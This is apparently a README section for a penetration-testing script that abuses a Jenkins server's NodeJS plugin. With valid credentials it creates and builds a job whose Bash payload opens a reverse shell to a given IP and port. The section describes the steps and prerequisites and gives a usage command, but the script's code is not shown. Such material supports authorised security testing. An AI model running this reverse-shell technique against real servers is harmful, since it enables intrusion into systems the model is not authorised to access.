## linux_revshell_nodejs.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Linux. Linux must have [NodeJS](https://nodejs.org/en/download) application installed. Additionally, Jenkins must have the "[nodejs](https://plugins.jenkins.io/nodejs/)" plugin installed.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new **"Freestyle project"** JOB.\
![linux_revshell_nodejs_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_nodejs.py/images/linux_revshell_nodejs_1.png)

Then configures or BUILD it to **"Execute NodeJS script"** with the **Bash** payload.\
![linux_revshell_nodejs_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_nodejs.py/images/linux_revshell_nodejs_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./linux_revshell_nodejs.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![linux_revshell_nodejs_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_nodejs.py/images/linux_revshell_nodejs_3.png)
![linux_revshell_nodejs_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/linux_revshell_nodejs.py/images/linux_revshell_nodejs_4.png)

Tested on Jenkins 2.150.2 on Ubuntu Server 22.04.3 LTS
